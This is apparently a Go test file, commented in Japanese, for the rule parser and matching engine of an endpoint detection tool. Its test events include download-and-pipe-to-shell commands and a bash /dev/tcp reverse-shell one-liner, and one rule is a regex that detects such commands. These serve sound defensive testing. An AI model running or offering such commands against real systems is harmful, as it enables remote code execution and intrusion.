package rules

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"susanoo/internal/event"
)

const sample = `{
  "version": 3,
  "name": "試験",
  "issued_at": "2026-10-18T00:00:00Z",
  "scoring": {"half_life": "12h"},
  "rules": [
    {"id": "honeytoken", "name": "おとり（試験運用）", "finding": "honeytoken", "mode": "monitor", "score": 100},
    {"id": "dns-bad", "name": "悪い名前の問い合わせ", "class": "dns", "mode": "enforce", "score": 40, "severity": 4,
     "match": {"field": "query.hostname", "op": "suffix", "value": ".bad.test"}},
    {"id": "curl-pipe", "name": "ダウンロードしてそのまま実行", "class": "process", "mode": "enforce", "score": 60,
     "match": {"all": [
       {"field": "process.cmd_line", "op": "regex", "value": "(curl|wget) .*\\|\\s*(ba)?sh"},
       {"not": {"field": "process.user.name", "op": "in", "values": ["builder"]}}
     ]}},
    {"id": "many-dns", "name": "大量の問い合わせ", "class": "dns", "mode": "monitor", "score": 10,
     "threshold": {"count": 3, "window": "1m"}, "groups": ["server"],
     "match": {"field": "query.hostname", "op": "exists"}}
  ],
  "exceptions": [
    {"rules": ["dns-bad"], "devices": ["pc-009"], "reason": "検証用の端末"},
    {"rules": ["*"], "groups": ["lab"], "until": "2026-10-19T00:00:00Z", "reason": "検証期間"}
  ]
}`

func TestParse(t *testing.T) {
	s, err := Parse([]byte(sample))
	if err != nil {
		t.Fatal(err)
	}
	if s.Version != 3 || len(s.Rules) != 4 || len(s.Exceptions) != 2 || s.Scoring.HalfLife.Or(0) != 12*time.Hour {
		t.Errorf("読んだ内容 = %+v", s)
	}
	if s.Rules[1].FindingSeverity() != event.SeverityHigh || s.Rules[2].FindingSeverity() != event.SeverityMedium {
		t.Errorf("重大度 = %d %d", s.Rules[1].FindingSeverity(), s.Rules[2].FindingSeverity())
	}
}

func TestParseRejects(t *testing.T) {
	base := `"version": 1, "issued_at": "2026-10-18T00:00:00Z"`
	rule := func(r string) string { return `{` + base + `, "rules": [` + r + `]}` }
	for name, tc := range map[string]struct{ data, want string }{
		"知らない項目":      {`{` + base + `, "rules": [], "extra": 1}`, "unknown field"},
		"余分なデータ":      {`{` + base + `, "rules": []} {}`, "余分なデータ"},
		"版数がない":       {`{"issued_at": "2026-10-18T00:00:00Z", "rules": []}`, "version"},
		"発行時刻がない":     {`{"version": 1, "rules": []}`, "issued_at"},
		"不正な ID":      {rule(`{"id": "Bad_ID", "name": "x", "finding": "honeytoken", "mode": "enforce"}`), "id は"},
		"ID の重複":      {rule(`{"id": "a", "name": "x", "finding": "honeytoken", "mode": "enforce"}, {"id": "a", "name": "y", "finding": "tamper", "mode": "enforce"}`), "重複"},
		"名前がない":       {rule(`{"id": "a", "finding": "honeytoken", "mode": "enforce"}`), "name"},
		"不正な扱い":       {rule(`{"id": "a", "name": "x", "finding": "honeytoken", "mode": "block"}`), "mode"},
		"点が大きすぎる":     {rule(`{"id": "a", "name": "x", "finding": "honeytoken", "mode": "enforce", "score": 5000}`), "score"},
		"重大度が範囲外":     {rule(`{"id": "a", "name": "x", "finding": "honeytoken", "mode": "enforce", "severity": 9}`), "severity"},
		"finding と条件": {rule(`{"id": "a", "name": "x", "finding": "honeytoken", "class": "dns", "mode": "enforce", "match": {"field": "a", "op": "exists"}}`), "一緒に"},
		"条件のルールの印":    {rule(`{"id": "a", "name": "x", "finding": "rule_match", "mode": "enforce"}`), "rule_match"},
		"対象がない":       {rule(`{"id": "a", "name": "x", "mode": "enforce"}`), "finding か"},
		"知らない種類":      {rule(`{"id": "a", "name": "x", "class": "login", "mode": "enforce", "match": {"field": "a", "op": "exists"}}`), "class"},
		"知らない比べ方":     {rule(`{"id": "a", "name": "x", "class": "dns", "mode": "enforce", "match": {"field": "a", "op": "like", "value": "x"}}`), "op"},
		"条件が 2 種類":    {rule(`{"id": "a", "name": "x", "class": "dns", "mode": "enforce", "match": {"field": "a", "op": "exists", "not": {"field": "b", "op": "exists"}}}`), "どれか 1 つ"},
		"不正な正規表現":     {rule(`{"id": "a", "name": "x", "class": "dns", "mode": "enforce", "match": {"field": "a", "op": "regex", "value": "("}}`), "regex"},
		"不正なアドレスの範囲":  {rule(`{"id": "a", "name": "x", "class": "dns", "mode": "enforce", "match": {"field": "a", "op": "cidr", "value": "10.0.0.0/33"}}`), "cidr"},
		"数でない値":       {rule(`{"id": "a", "name": "x", "class": "dns", "mode": "enforce", "match": {"field": "a", "op": "gt", "value": "5"}}`), "数に"},
		"in の値がない":    {rule(`{"id": "a", "name": "x", "class": "dns", "mode": "enforce", "match": {"field": "a", "op": "in"}}`), "values"},
		"不正なしきい値":     {rule(`{"id": "a", "name": "x", "class": "dns", "mode": "enforce", "match": {"field": "a", "op": "exists"}, "threshold": {"count": 1, "window": "1m"}}`), "threshold.count"},
		"短すぎる区間":      {rule(`{"id": "a", "name": "x", "class": "dns", "mode": "enforce", "match": {"field": "a", "op": "exists"}, "threshold": {"count": 2, "window": "10ms"}}`), "threshold.window"},
		"不正なグループ":     {rule(`{"id": "a", "name": "x", "finding": "honeytoken", "mode": "enforce", "groups": ["a~canary"]}`), "groups"},
		"例外の理由がない":    {`{` + base + `, "rules": [], "exceptions": [{"rules": ["*"]}]}`, "reason"},
		"例外のルールがない":   {`{` + base + `, "rules": [], "exceptions": [{"reason": "x"}]}`, "rules に"},
		"例外の空の値":      {`{` + base + `, "rules": [], "exceptions": [{"rules": ["*"], "devices": [""], "reason": "x"}]}`, "空の値"},
		"負の半減期":       {`{` + base + `, "rules": [], "scoring": {"half_life": "-1h"}}`, "負"},
		"入れ子が深すぎる":    {rule(`{"id": "a", "name": "x", "class": "dns", "mode": "enforce", "match": ` + strings.Repeat(`{"not": `, 10) + `{"field": "a", "op": "exists"}` + strings.Repeat(`}`, 10) + `}`), "入れ子"},
	} {
		t.Run(name, func(t *testing.T) {
			_, err := Parse([]byte(tc.data))
			if err == nil || !strings.Contains(err.Error(), tc.want) {
				t.Errorf("エラー = %v（%q を含むこと）", err, tc.want)
			}
		})
	}
}

func sampleEvent() *event.Event {
	e := event.New(event.ClassProcessActivity, event.ProcessLaunch, event.SeverityInformational, time.Now())
	e.Process = &event.Process{PID: 4242, Name: "bash", CmdLine: "curl -s http://x.test/i.sh | sh", User: &event.User{Name: "alice"}}
	e.Device = &event.Device{UID: "pc-001", IP: "192.168.10.23"}
	e.DstEndpoint = &event.Endpoint{IP: "203.0.113.9", Port: 443}
	e.Traffic = &event.Traffic{BytesOut: 5000}
	e.Answers = []event.DNSAnswer{{Rdata: "198.51.100.1"}, {Rdata: "198.51.100.2"}}
	return e
}

func TestCond(t *testing.T) {
	doc, err := NewDoc(sampleEvent())
	if err != nil {
		t.Fatal(err)
	}
	for _, tc := range []struct {
		cond string
		want bool
	}{
		{`{"field": "process.name", "op": "eq", "value": "bash"}`, true},
		{`{"field": "process.name", "op": "eq", "value": "BASH"}`, false},
		{`{"field": "process.name", "op": "eq", "value": "BASH", "case_insensitive": true}`, true},
		{`{"field": "process.name", "op": "ne", "value": "bash"}`, false},
		{`{"field": "process.name", "op": "ne", "value": "zsh"}`, true},
		{`{"field": "process.cmd_line", "op": "contains", "value": "| sh"}`, true},
		{`{"field": "process.cmd_line", "op": "prefix", "value": "curl "}`, true},
		{`{"field": "process.cmd_line", "op": "suffix", "value": "sh"}`, true},
		{`{"field": "process.cmd_line", "op": "regex", "value": "^CURL", "case_insensitive": true}`, true},
		{`{"field": "process.user.name", "op": "in", "values": ["bob", "Alice"], "case_insensitive": true}`, true},
		{`{"field": "process.user.name", "op": "in", "values": ["bob"]}`, false},
		{`{"field": "dst_endpoint.ip", "op": "cidr", "value": "203.0.113.0/24"}`, true},
		{`{"field": "dst_endpoint.ip", "op": "cidr", "value": "10.0.0.0/8"}`, false},
		{`{"field": "dst_endpoint.port", "op": "eq", "value": 443}`, true},
		{`{"field": "traffic.bytes_out", "op": "gt", "value": 4999}`, true},
		{`{"field": "traffic.bytes_out", "op": "lte", "value": 4999}`, false},
		{`{"field": "process.pid", "op": "gte", "value": 4242}`, true},
		{`{"field": "process.pid", "op": "lt", "value": 4242}`, false},
		{`{"field": "answers.rdata", "op": "eq", "value": "198.51.100.2"}`, true}, // 配列のどれか
		{`{"field": "answers.rdata", "op": "ne", "value": "198.51.100.2"}`, false},
		{`{"field": "process.parent_process.name", "op": "exists"}`, false},
		{`{"field": "process.name", "op": "gt", "value": 1}`, false}, // 数でない値
		{`{"field": "device.uid", "op": "cidr", "value": "10.0.0.0/8"}`, false},
		{`{"all": [{"field": "process.name", "op": "eq", "value": "bash"}, {"field": "device.uid", "op": "eq", "value": "pc-001"}]}`, true},
		{`{"all": [{"field": "process.name", "op": "eq", "value": "bash"}, {"field": "device.uid", "op": "eq", "value": "pc-002"}]}`, false},
		{`{"any": [{"field": "process.name", "op": "eq", "value": "zsh"}, {"field": "device.uid", "op": "eq", "value": "pc-001"}]}`, true},
		{`{"not": {"field": "process.name", "op": "eq", "value": "bash"}}`, false},
	} {
		s, err := Parse([]byte(`{"version": 1, "issued_at": "2026-10-18T00:00:00Z", "rules": [{"id": "a", "name": "x", "class": "process", "mode": "enforce", "match": ` + tc.cond + `}]}`))
		if err != nil {
			t.Fatalf("%s: %v", tc.cond, err)
		}
		if got := s.Rules[0].Match.Eval(doc); got != tc.want {
			t.Errorf("%s = %v", tc.cond, got)
		}
	}
	if got := doc.Get("process.user.name"); got != "alice" {
		t.Errorf("Get = %q", got)
	}
}

// 配布したルールは同じ ID の既定のルールを置き換え、書いていない既定のルールは残る。
func TestMerge(t *testing.T) {
	s, err := Parse([]byte(sample))
	if err != nil {
		t.Fatal(err)
	}
	got := Merge(s)
	if len(got) != len(Defaults)+3 {
		t.Fatalf("ルールの数 = %d", len(got))
	}
	for _, r := range got {
		if r.ID == "honeytoken" && r.Mode != ModeMonitor {
			t.Errorf("置き換えていない: %+v", r)
		}
	}
	for _, d := range Defaults {
		d := d
		if err := d.prepare(); err != nil {
			t.Errorf("既定のルール %s: %v", d.ID, err)
		}
	}
	// 既定のルールは変わらない。
	if Defaults[0].Mode != ModeEnforce {
		t.Error("既定のルールを書き換えた")
	}
}

// config/rules.example.json は検証に通る（配布のときに版数と発行時刻を付ける）。
func TestExample(t *testing.T) {
	data, err := os.ReadFile(filepath.Join("..", "..", "..", "config", "rules.example.json"))
	if err != nil {
		t.Fatal(err)
	}
	var m map[string]any
	if err := json.Unmarshal(data, &m); err != nil {
		t.Fatal(err)
	}
	m["version"], m["issued_at"] = 1, "2026-10-18T00:00:00Z"
	filled, _ := json.Marshal(m)
	s, err := Parse(filled)
	if err != nil {
		t.Fatalf("config/rules.example.json が検証に通らない: %v", err)
	}
	for _, r := range s.Rules {
		if r.Mode != ModeMonitor {
			t.Errorf("例の新しいルール %s は試験運用から始める", r.ID)
		}
	}
	e := NewEngine(s)
	var c Counter
	p := sampleEvent()
	p.Process.CmdLine = "curl -fsSL https://x.test/install.sh | sudo bash"
	if hits := e.Evaluate(p, Subject{Group: "default"}, &c, now); len(hits) != 1 || hits[0].Rule.ID != "download-and-run" || hits[0].Excepted != nil {
		t.Errorf("ダウンロードしてそのまま実行 = %v", ids(hits))
	}
	p.Process.User.Name = "deploy"
	if hits := e.Evaluate(p, Subject{Group: "server"}, &c, now); len(hits) != 1 || hits[0].Excepted == nil {
		t.Errorf("配備の例外 = %v", ids(hits))
	}
	p.Process.CmdLine = "bash -i >& /dev/tcp/203.0.113.5/4444 0>&1"
	if hits := e.Evaluate(p, Subject{}, &c, now); len(hits) != 1 || hits[0].Rule.ID != "reverse-shell" {
		t.Errorf("リバースシェル = %v", ids(hits))
	}
	if hits := e.Evaluate(dnsQuery(strings.Repeat("a1", 30)+".tunnel.test"), Subject{}, &c, now); len(hits) != 1 || hits[0].Rule.ID != "long-dns-label" {
		t.Errorf("長い名前 = %v", ids(hits))
	}
}
